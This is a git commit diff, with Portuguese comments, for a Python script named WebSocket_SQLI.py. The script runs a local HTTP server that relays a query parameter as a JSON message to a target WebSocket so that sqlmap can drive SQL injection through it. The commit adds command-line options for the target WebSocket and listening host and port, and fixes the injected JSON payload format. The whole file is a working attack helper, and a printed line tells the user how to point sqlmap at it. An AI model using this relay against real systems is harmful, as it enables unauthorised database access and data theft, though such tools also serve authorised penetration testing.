77c0d2c0f4d81aa60c4dbc386b3e2644aa934888
root <root@pop-os.localdomain>
2022-12-29 15:43:35 -0300

    Reformando o script com argumentos

--- WebSocket_SQLI.py
+++ WebSocket_SQLI.py
@@ -1,16 +1,18 @@
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from websocket import create_connection
 from urllib.parse import unquote, urlparse
+from argparse import RawTextHelpFormatter
+import argparse
 
-servidor_ws = "ws://localhost:8000"
 
 class Send_Websocket():	
 
 	def enviar_ws(payload):
+		servidor_ws = args.Websocket
 		connection_ws = create_connection(servidor_ws)
 
 		message = unquote(payload).replace('"','\'')
-		data = "{\"id\"}:{\""+message+"\"}" # payload para enviar ao websocket com a injeção sql
+		data = "{\"id\":\""+message+"\"}" # payload para enviar ao websocket com a injeção sql
 
 		connection_ws.send(data)
 		resp = connection_ws.recv()
@@ -25,7 +27,6 @@ class HTTP(BaseHTTPRequestHandler):
 
 	def do_GET(self):
 		self.send_response(200)
-
 		try:
 			payload = urlparse(self.path).query.split('=',1)[1] # /?id=123
 			
@@ -41,7 +42,15 @@ class HTTP(BaseHTTPRequestHandler):
 		self.end_headers()
 		self.wfile.write(bytes())
 		return
-	
-server = HTTPServer(("127.0.0.1",6060),HTTP)
-print("Use esse comando em outro terminal para realização a injeção com sqlmap: sqlmap -u \"http://ip:port/?id=123\" -p id .....")
-server.serve_forever()
+
+parser = argparse.ArgumentParser(usage="python3 WebSocket_SQLI.py --ws \"ws://teste:9000/\" --lhost 127.0.0.1 --lport 6060 ",formatter_class=RawTextHelpFormatter)
+
+parser.add_argument("--ws","-W",dest="Websocket",action="store",type=str,required=False,help="Insert the websocket for the test")
+parser.add_argument("--lhost",dest="host",action="store",type=str,required=True,default="127.0.0.1",help="Enter your ip. Default=127.0.0.1")
+parser.add_argument("--lport",dest="port",action="store",type=int,required=True,default="80",help="Enter your port. Default=80")
+args = parser.parse_args()
+
+if __name__ == "__main__":
+	server = HTTPServer((args.host,args.port),HTTP)
+	print("Use esse comando em outro terminal para realização da injeção com sqlmap: sqlmap -u \"http://ip:port/?id=123\" -p id .....")
+	server.serve_forever()
